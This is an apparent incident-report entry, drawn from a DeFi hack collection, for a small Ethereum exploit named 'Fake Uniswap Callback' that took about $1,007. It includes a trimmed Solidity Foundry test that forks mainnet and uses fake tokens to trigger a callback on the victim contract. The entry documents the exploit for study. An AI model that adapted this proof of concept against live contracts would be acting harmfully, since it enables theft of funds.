# [?] Unverified6883 - Fake Uniswap Callback

## Summary
Severity: Unknown
Chain: Ethereum
Component: Unverified6883
Published: 2025-07-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/Unverified6883_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1,006.89

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d;
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
    address private constant TEMP_HELPER = 0x25bCC6F744D2b23CE39D8189E151dE4aA621Bb6c;
    uint256 private constant FORK_BLOCK = 23_002_633;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;

    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(WETH);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(VICTIM, "unverified callback target");
        vm.label(TEMP_TOKEN, "temporary token");
        vm.label(TEMP_HELPER, "temporary helper");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public balanceLog {
        FakeERC20 implementation = new FakeERC20();
        vm.etch(TEMP_TOKEN, address(implementation).code);
        NoopSwapHelper helperImplementation = new NoopSwapHelper();
        vm.etch(TEMP_HELPER, address(helperImplementation).code);

        FakeCallbackExploit exploit = new FakeCallbackExploit(ATTACKER);
        FakeERC20(TEMP_TOKEN).mint(address(exploit), 1_000_000_000 ether);

        uint256 beforeBalance = WETH.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.execute();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/Unverified6883_exp.sol_
